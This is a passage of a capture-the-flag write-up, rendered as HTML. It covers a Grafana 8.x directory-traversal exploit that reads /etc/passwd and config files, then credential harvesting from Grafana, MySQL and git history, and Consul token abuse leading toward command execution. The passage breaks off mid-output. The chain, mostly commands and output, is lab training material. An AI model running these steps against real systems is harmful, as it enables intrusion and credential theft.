+<span class="o">[</span><span class="m">17</span>:06:29<span class="o">]</span><span class="w"> </span><span class="m">301</span><span class="w"> </span>-<span class="w">  </span>309B<span class="w">  </span>-<span class="w"> </span>/tags<span class="w">  </span>-&gt;<span class="w">  </span>http://example.org/tags/
+
+Task<span class="w"> </span>Completed
+</pre></div>
+</div>
+<p><a class="reference external" href="https://gohugo.io/">https://gohugo.io/</a><br />
+<a class="reference external" href="https://gohugo.io/getting-started/installing#fetch-from-github">https://gohugo.io/getting-started/installing#fetch-from-github</a><br />
+<a class="reference external" href="https://github.com/gohugoio/hugo">https://github.com/gohugoio/hugo</a></p>
+</section>
+<section id="grafana-8-0-0-8-3-0-directory-traversal">
+<h2>Grafana 8.0.0 -&gt; 8.3.0 - Directory traversal<a class="headerlink" href="#grafana-8-0-0-8-3-0-directory-traversal" title="Permalink to this heading">#</a></h2>
+<p>we know that grafana is 8.2.0 and the Directory Traversal vulnerability bellow is from 8.0.0 to 8.3.0</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>searchsploit<span class="w"> </span>grafana
+---------------------------------------------------------------------------<span class="w"> </span>---------------------------------
+<span class="w"> </span>Exploit<span class="w"> </span>Title<span class="w">                                                             </span><span class="p">|</span><span class="w">  </span>Path
+---------------------------------------------------------------------------<span class="w"> </span>---------------------------------
+Grafana<span class="w"> </span><span class="m">7</span>.0.1<span class="w"> </span>-<span class="w"> </span>Denial<span class="w"> </span>of<span class="w"> </span>Service<span class="w"> </span><span class="o">(</span>PoC<span class="o">)</span><span class="w">                                    </span><span class="p">|</span><span class="w"> </span>linux/dos/48638.sh
+Grafana<span class="w"> </span><span class="m">8</span>.3.0<span class="w"> </span>-<span class="w"> </span>Directory<span class="w"> </span>Traversal<span class="w"> </span>and<span class="w"> </span>Arbitrary<span class="w"> </span>File<span class="w"> </span>Read<span class="w">                </span><span class="p">|</span><span class="w"> </span>multiple/webapps/50581.py
+---------------------------------------------------------------------------<span class="w"> </span>---------------------------------
+Shellcodes:<span class="w"> </span>No<span class="w"> </span>Results
+</pre></div>
+</div>
+<p>and it works indeed</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python3<span class="w"> </span>grafana-traversal.py<span class="w"> </span>-H<span class="w"> </span>http://example.org:3000
+Read<span class="w"> </span>file<span class="w"> </span>&gt;<span class="w"> </span>/etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing<span class="w"> </span>List<span class="w"> </span>Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats<span class="w"> </span>Bug-Reporting<span class="w"> </span>System<span class="w"> </span><span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd<span class="w"> </span>Network<span class="w"> </span>Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd<span class="w"> </span>Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd<span class="w"> </span>Time<span class="w"> </span>Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM<span class="w"> </span>software<span class="w"> </span>stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux<span class="w"> </span>daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd<span class="w"> </span>Core<span class="w"> </span>Dumper:/:/usr/sbin/nologin
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+grafana:x:113:118::/usr/share/grafana:/bin/false
+mysql:x:114:119:MySQL<span class="w"> </span>Server,,,:/nonexistent:/bin/false
+consul:x:997:997::/home/consul:/bin/false
+
+Read<span class="w"> </span>file<span class="w"> </span>&gt;
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>sh$<span class="w"> </span>passwd
+root:x:0:0:root:/root:/bin/bash
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>grep<span class="w"> </span>graf<span class="w"> </span>passwd
+grafana:x:113:118::/usr/share/grafana:/bin/false
+</pre></div>
+</div>
+<p>looking at the documentation for grafana, we’re pulling the default config location for an ubuntu install</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/etc/grafana/grafana.ini
+</pre></div>
+</div>
+<p>the only non default config is the admin password
+and it successfully logs us in the admin portal</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">admin_password</span> <span class="o">=</span> <span class="n">messageInABottle685427</span>
+</pre></div>
+</div>
+<p>the portal shows that the config file for the datasource is “mysql.yaml”<br />
+again looking a little into the documentation, we’re pulling the mysql datasource config file with the same exploit<br />
+and that gives us the  password for the grafana mysql database user</p>
+<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">Read file &gt; /etc/grafana/provisioning/datasources/mysql.yaml</span>
+<span class="l l-Scalar l-Scalar-Plain">apiVersion</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1</span>
+
+<span class="nt">datasources</span><span class="p">:</span>
+<span class="w"> </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mysql.yaml</span>
+<span class="w">   </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mysql</span>
+<span class="w">   </span><span class="nt">host</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">localhost</span>
+<span class="w">   </span><span class="nt">database</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">grafana</span>
+<span class="w">   </span><span class="nt">user</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">grafana</span>
+<span class="w">   </span><span class="nt">password</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">dontStandSoCloseToMe63221!</span>
+<span class="w">   </span><span class="nt">editable</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span>
+</pre></div>
+</div>
+</section>
+<section id="connecting-to-the-mysql-database">
+<h2>Connecting to the MySQL database<a class="headerlink" href="#connecting-to-the-mysql-database" title="Permalink to this heading">#</a></h2>
+<p>as we know the db is exposed to over the network, so at this stage nothing prevents us from connecting directly</p>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">mysql</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">grafana</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="n">example</span><span class="p">.</span><span class="n">org</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="n">grafana</span>
+</pre></div>
+</div>
+<div class="highlight-sql notranslate"><div class="highlight"><pre><span></span><span class="n">MySQL</span><span class="w"> </span><span class="p">[</span><span class="n">whackywidget</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">;</span>
+<span class="o">+</span><span class="c1">-----------+------------------------------------------+</span>
+<span class="o">|</span><span class="w"> </span><span class="k">user</span><span class="w">      </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">                                     </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------+------------------------------------------+</span>
+<span class="o">|</span><span class="w"> </span><span class="n">developer</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg</span><span class="o">==</span><span class="w"> </span><span class="o">|</span>
+<span class="o">+</span><span class="c1">-----------+------------------------------------------+</span>
+</pre></div>
+</div>
+<p>the password isn’t even hashed that’s embarassing</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&#39;</span><span class="p">|</span>base64<span class="w"> </span>-d
+anEnglishManInNewYork027468
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>developer@ambassador:~$<span class="w"> </span>wc<span class="w"> </span>-c<span class="w"> </span>user.txt
+<span class="m">33</span><span class="w"> </span>user.txt
+</pre></div>
+</div>
+</section>
+<section id="forraging-git-history-for-tokens">
+<h2>Forraging git history for tokens<a class="headerlink" href="#forraging-git-history-for-tokens" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>-l
+<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>developer:
+Sorry,<span class="w"> </span>user<span class="w"> </span>developer<span class="w"> </span>may<span class="w"> </span>not<span class="w"> </span>run<span class="w"> </span>sudo<span class="w"> </span>on<span class="w"> </span>ambassador.
+</pre></div>
+</div>
+<p>the git config in the developer users’s home points to /opt/my-app where the whacky app thing resides</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>.gitconfig
+<span class="o">[</span>user<span class="o">]</span>
+<span class="w">        </span><span class="nv">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Developer
+<span class="w">        </span><span class="nv">email</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>developer@ambassador.local
+<span class="o">[</span>safe<span class="o">]</span>
+<span class="w">        </span><span class="nv">directory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>/opt/my-app
+</pre></div>
+</div>
+<p>so we can look at the git logs in there</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="w"> </span>git<span class="w"> </span>log<span class="w"> </span>--oneline
+33a53ef<span class="w"> </span><span class="o">(</span>HEAD<span class="w"> </span>-&gt;<span class="w"> </span>main<span class="o">)</span><span class="w"> </span>tidy<span class="w"> </span>config<span class="w"> </span>script
+c982db8<span class="w"> </span>config<span class="w"> </span>script
+8dce657<span class="w"> </span>created<span class="w"> </span>project<span class="w"> </span>with<span class="w"> </span>django<span class="w"> </span>CLI
+4b8597b<span class="w"> </span>.gitignore
+</pre></div>
+</div>
+<p>and get a token to talk to the consul API</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>git<span class="w"> </span>show<span class="w"> </span>33a53ef
+commit<span class="w"> </span>33a53ef9a207976d5ceceddc41a199558843bf3c<span class="w"> </span><span class="o">(</span>HEAD<span class="w"> </span>-&gt;<span class="w"> </span>main<span class="o">)</span>
+Author:<span class="w"> </span>Developer<span class="w"> </span>&lt;developer@ambassador.local&gt;
+Date:<span class="w">   </span>Sun<span class="w"> </span>Mar<span class="w"> </span><span class="m">13</span><span class="w"> </span><span class="m">23</span>:47:36<span class="w"> </span><span class="m">2022</span><span class="w"> </span>+0000
+
+<span class="w">    </span>tidy<span class="w"> </span>config<span class="w"> </span>script
+
+diff<span class="w"> </span>--git<span class="w"> </span>a/whackywidget/put-config-in-consul.sh<span class="w"> </span>b/whackywidget/put-config-in-consul.sh
+index<span class="w"> </span>35c08f6..fc51ec0<span class="w"> </span><span class="m">100755</span>
+---<span class="w"> </span>a/whackywidget/put-config-in-consul.sh
++++<span class="w"> </span>b/whackywidget/put-config-in-consul.sh
+@@<span class="w"> </span>-1,4<span class="w"> </span>+1,4<span class="w"> </span>@@
+<span class="w"> </span><span class="c1"># We use Consul for application config in production, this script will help set the correct values for the app</span>
+-#<span class="w"> </span>Export<span class="w"> </span>MYSQL_PASSWORD<span class="w"> </span>before<span class="w"> </span>running
++#<span class="w"> </span>Export<span class="w"> </span>MYSQL_PASSWORD<span class="w"> </span>and<span class="w"> </span>CONSUL_HTTP_TOKEN<span class="w"> </span>before<span class="w"> </span>running
+
+-consul<span class="w"> </span>kv<span class="w"> </span>put<span class="w"> </span>--token<span class="w"> </span>bb03b43b-1d81-d62b-24b5-39540ee469b5<span class="w"> </span>whackywidget/db/mysql_pw<span class="w"> </span><span class="nv">$MYSQL_PASSWORD</span>
++consul<span class="w"> </span>kv<span class="w"> </span>put<span class="w"> </span>whackywidget/db/mysql_pw<span class="w"> </span><span class="nv">$MYSQL_PASSWORD</span>
+</pre></div>
+</div>
+<p>looks like this thing offers some kind of secret management:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>consul<span class="w"> </span>kv<span class="w"> </span>get<span class="w"> </span>--token<span class="w"> </span>bb03b43b-1d81-d62b-24b5-39540ee469b5<span class="w"> </span>whackywidget/db/mysql_pw
+dontStandSoCloseToMe63221!
+</pre></div>
+</div>
+<p>but there’s nothing in there that we don’t already know</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>consul<span class="w"> </span>kv<span class="w"> </span><span class="nb">export</span><span class="w"> </span>--token<span class="w"> </span>bb03b43b-1d81-d62b-24b5-39540ee469b5
+<span class="o">[</span>
+<span class="w">        </span><span class="o">{</span>
+<span class="w">                </span><span class="s2">&quot;key&quot;</span>:<span class="w"> </span><span class="s2">&quot;test&quot;</span>,
+<span class="w">                </span><span class="s2">&quot;flags&quot;</span>:<span class="w"> </span><span class="m">0</span>,
+<span class="w">                </span><span class="s2">&quot;value&quot;</span>:<span class="w"> </span><span class="s2">&quot;aGVsbG8=&quot;</span>
+<span class="w">        </span><span class="o">}</span>,
+<span class="w">        </span><span class="o">{</span>
+<span class="w">                </span><span class="s2">&quot;key&quot;</span>:<span class="w"> </span><span class="s2">&quot;whackywidget/db/mysql_pw&quot;</span>,
+<span class="w">                </span><span class="s2">&quot;flags&quot;</span>:<span class="w"> </span><span class="m">0</span>,
+<span class="w">                </span><span class="s2">&quot;value&quot;</span>:<span class="w"> </span><span class="s2">&quot;ZG9udFN0YW5kU29DbG9zZVRvTWU2MzIyMSE=&quot;</span>
+<span class="w">        </span><span class="o">}</span>
+<span class="o">]</span>
+</pre></div>
+</div>
+<p>there’s also the Django secret key, I believe that might allow us to do some attacks on the cryptography related methods in django, not sure that’s relevant right now.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>+#<span class="w"> </span>Quick-start<span class="w"> </span>development<span class="w"> </span>settings<span class="w"> </span>-<span class="w"> </span>unsuitable<span class="w"> </span><span class="k">for</span><span class="w"> </span>production
++#<span class="w"> </span>See<span class="w"> </span>https://docs.djangoproject.com/en/4.0/howto/deployment/checklist/
++
++#<span class="w"> </span>SECURITY<span class="w"> </span>WARNING:<span class="w"> </span>keep<span class="w"> </span>the<span class="w"> </span>secret<span class="w"> </span>key<span class="w"> </span>used<span class="w"> </span><span class="k">in</span><span class="w"> </span>production<span class="w"> </span>secret!
++SECRET_KEY<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;django-insecure--lqw3fdyxw(28h#0(w8_te*wm*6ppl@g!ttcpo^m-ig!qtqy!l&#39;</span>
+</pre></div>
+</div>
+</section>
+<section id="exploring-the-inner-workings-of-consul">
+<h2>Exploring the inner workings of Consul<a class="headerlink" href="#exploring-the-inner-workings-of-consul" title="Permalink to this heading">#</a></h2>
+<p>I know very little about consul, but from what I started reading this is a mesh networking solution for microservice oriented architectures. So in theory this is used to connect various containers accross nodes and datacenters. I don’t believe there’s any kubernetes running here, but there’s lxd. I’ll need to poke around to understand what consul really offers and how it works.</p>
+<p>ports that seem related to consul</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>netstat<span class="w"> </span>-tulpen<span class="p">|</span>grep<span class="w"> </span><span class="m">127</span>.0.0.1:8<span class="p">|</span>grep<span class="w"> </span>tcp
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:8300<span class="w">          </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">38103</span><span class="w">      </span>-
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:8301<span class="w">          </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">38108</span><span class="w">      </span>-
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:8302<span class="w">          </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">38105</span><span class="w">      </span>-
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:8500<span class="w">          </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">38122</span><span class="w">      </span>-
+tcp<span class="w">        </span><span class="m">0</span><span class="w">      </span><span class="m">0</span><span class="w"> </span><span class="m">127</span>.0.0.1:8600<span class="w">          </span><span class="m">0</span>.0.0.0:*<span class="w">               </span>LISTEN<span class="w">      </span><span class="m">0</span><span class="w">          </span><span class="m">38119</span><span class="w">      </span>-
+</pre></div>
+</div>
+<p><a class="reference external" href="https://www.consul.io/docs/install/ports">https://www.consul.io/docs/install/ports</a></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">8300</span> <span class="o">-&gt;</span> <span class="n">Server</span> <span class="n">RPC</span>            <span class="o">-</span> <span class="n">This</span> <span class="ow">is</span> <span class="n">used</span> <span class="n">by</span> <span class="n">servers</span> <span class="n">to</span> <span class="n">handle</span> <span class="n">incoming</span> <span class="n">requests</span> <span class="kn">from</span> <span class="nn">other</span> <span class="n">agents</span>
+<span class="mi">8301</span> <span class="o">-&gt;</span> <span class="n">LAN</span> <span class="n">Serf</span>              <span class="o">-</span> <span class="n">used</span> <span class="n">to</span> <span class="n">handle</span> <span class="n">gossip</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">LAN</span><span class="o">.</span> <span class="n">Required</span> <span class="n">by</span> <span class="nb">all</span> <span class="n">agents</span>
+<span class="mi">8302</span> <span class="o">-&gt;</span> <span class="n">WAN</span> <span class="n">Serf</span>              <span class="o">-</span> <span class="n">used</span> <span class="n">by</span> <span class="n">servers</span> <span class="n">to</span> <span class="n">gossip</span> <span class="n">over</span> <span class="n">the</span> <span class="n">WAN</span><span class="p">,</span> <span class="n">to</span> <span class="n">other</span> <span class="n">servers</span>
+<span class="mi">8500</span> <span class="o">-&gt;</span> <span class="n">consul</span> <span class="n">agent</span> <span class="n">HTTP</span> <span class="n">API</span> <span class="o">-</span> <span class="n">used</span> <span class="n">by</span> <span class="n">clients</span> <span class="n">to</span> <span class="n">talk</span> <span class="n">to</span> <span class="n">the</span> <span class="n">HTTP</span> <span class="n">API</span> <span class="p">(</span><span class="n">ui</span> <span class="n">disabled</span> <span class="ow">in</span> <span class="n">our</span> <span class="n">case</span><span class="p">)</span>
+<span class="mi">8600</span> <span class="o">-&gt;</span> <span class="n">consul</span> <span class="n">DNS</span>            <span class="o">-</span> <span class="n">resolve</span> <span class="n">DNS</span> <span class="n">queries</span>
+</pre></div>
+</div>
+<p>so the commands bellow are just a dump of things I tried:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">CONSUL_HTTP_TOKEN</span><span class="o">=</span>bb03b43b-1d81-d62b-24b5-39540ee469b5
+<span class="nb">export</span><span class="w"> </span>CONSUL_HTTP_TOKEN<span class="w"> </span>
+consul<span class="w"> </span>kv<span class="w"> </span>get<span class="w"> </span>whackywidget/db/mysql_pw
+consul<span class="w"> </span>kv<span class="w"> </span><span class="nb">export</span><span class="w"> </span>
+consul<span class="w"> </span>acl<span class="w"> </span>token<span class="w"> </span>list
+consul<span class="w"> </span>acl<span class="w"> </span>token<span class="w"> </span><span class="nb">read</span><span class="w"> </span>-self
+consul<span class="w"> </span>catalog<span class="w"> </span>datacenters
+consul<span class="w"> </span>catalog<span class="w"> </span>nodes
+consul<span class="w"> </span>catalog<span class="w"> </span>services
+consul<span class="w"> </span>reload
+consul<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>-node<span class="o">=</span>ambassador<span class="w"> </span><span class="s1">&#39;ip a&#39;</span><span class="w">   </span><span class="c1"># Not working </span>
+</pre></div>
+</div>
+</section>
+<section id="command-execution-with-the-consul-service-api">
+<h2>Command Execution with the Consul Service API<a class="headerlink" href="#command-execution-with-the-consul-service-api" title="Permalink to this heading">#</a></h2>
+<p><a class="reference external" href="https://www.consul.io/api-docs/api-structure">https://www.consul.io/api-docs/api-structure</a><br />
+<a class="reference external" href="https://www.consul.io/api-docs/agent/service#register-service">https://www.consul.io/api-docs/agent/service#register-service</a><br />
+first I’ll be forwarding the agent port to my local machine so I can use jq</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ssh<span class="w"> </span>-fNL<span class="w"> </span><span class="m">8500</span>:localhost:8500<span class="w"> </span>developer@example.org
+</pre></div>
+</div>
+<p>listing all existing services</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;X-Consul-Token: </span><span class="si">${</span><span class="nv">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-X<span class="w"> </span>GET<span class="w"> </span><span class="s1">&#39;http://127.0.0.1:8500/v1/agent/services&#39;</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
+<span class="w">  </span>jq<span class="w"> </span><span class="s2">&quot;.&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;meow&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;ID&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;meow&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;Service&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;meow&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;Tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">    </span><span class="nt">&quot;Meta&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
+<span class="w">    </span><span class="nt">&quot;Port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;Address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;TaggedAddresses&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;lan_ipv4&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;Address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;Port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span>
+<span class="w">      </span><span class="p">},</span>
+<span class="w">      </span><span class="nt">&quot;wan_ipv4&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;Address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;Port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span>
+<span class="w">      </span><span class="p">}</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;Weights&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;Passing&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;Warning&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;EnableTagOverride&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;Datacenter&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;dc1&quot;</span>
+<span class="w">  </span><span class="p">},</span>
+<span class="w">  </span><span class="nt">&quot;svc111&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;ID&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;svc111&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;Service&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;svc111&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;Tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">      </span><span class="s2">&quot;default&quot;</span>
+<span class="w">    </span><span class="p">],</span>
+<span class="w">    </span><span class="nt">&quot;Meta&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
+<span class="w">    </span><span class="nt">&quot;Port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;Address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;Weights&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;Passing&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;Warning&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">    </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;EnableTagOverride&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;Datacenter&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;dc1&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>listing a specific service</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-s<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;X-Consul-Token: </span><span class="si">${</span><span class="nv">token</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-X<span class="w"> </span>GET<span class="w"> </span><span class="s1">&#39;http://127.0.0.1:8500/v1/agent/service/meow&#39;</span><span class="w"> </span><span class="p">|</span><span class="se">\</span>
+<span class="w">  </span>jq<span class="w"> </span><span class="s2">&quot;.&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;ID&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;meow&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Service&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;meow&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">  </span><span class="nt">&quot;Meta&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
+<span class="w">  </span><span class="nt">&quot;Port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">80</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;Address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span>
